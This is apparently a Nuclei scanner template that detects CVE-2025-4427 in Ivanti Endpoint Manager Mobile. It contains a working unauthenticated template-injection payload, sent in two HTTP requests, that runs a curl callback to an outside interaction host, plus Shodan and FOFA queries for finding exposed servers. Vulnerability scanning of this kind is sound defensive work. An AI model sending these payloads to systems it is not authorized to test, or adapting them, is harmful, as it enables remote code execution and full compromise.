id: CVE-2025-4427

info:
  name: Ivanti Endpoint Manager Mobile - Unauthenticated Remote Code Execution
  author: iamnoooob,rootxharsh,parthmalhotra,pdresearch
  severity: critical
  description: |
    An authentication bypass in Ivanti Endpoint Manager Mobile allowing attackers to access protected resources without proper credentials. This leads to unauthenticated Remote Code Execution via unsafe userinput in one of the bean validators which is sink for Server-Side Template Injection.
  impact: |
    Unauthenticated attackers can execute arbitrary code with elevated privileges through server-side template injection in bean validators, achieving complete system compromise.
  remediation: |
    Apply the security patches as described in the Ivanti security advisory for Endpoint Manager Mobile.
  reference:
    - https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2025-4427
    cwe-id: CWE-288
    epss-score: 0.91247
    epss-percentile: 0.99628
  metadata:
    verified: true
    max-request: 2
    shodan-query: http.favicon.hash:"362091310"
    fofa-query: icon_hash="362091310"
    product: endpoint_manager_mobile
    vendor: ivanti
  tags: cve,cve2025,ivanti,epmm,rce,ssti,kev,vkev,vuln

http:
  - raw:
      - |
        GET /api/v2/featureusage_history?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20{{interactsh-url}}')%7d HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/v2/featureusage?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20{{interactsh-url}}')%7d HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "localizedMessage"

      - type: regex
        part: body
        regex:
          - "Format 'Process\\[pid="
          - "Format 'java\\.lang\\.UNIXProcess@[0-9a-f]+'"
        condition: or

      - type: word
        part: interactsh_protocol
        words:
          - dns

      - type: status
        status:
          - 400
# digest: 4a0a0047304502200fad6c2edecccb6d29e9664aa9dc75a6e0e2503f818a9c763556a829b1a01dc6022100897e8db322ab8ef8e70c6c1de28d51a7d7795ea7059d4fe350adb9512e6d1ee6:922c64590222798bb761d5b6d8e72950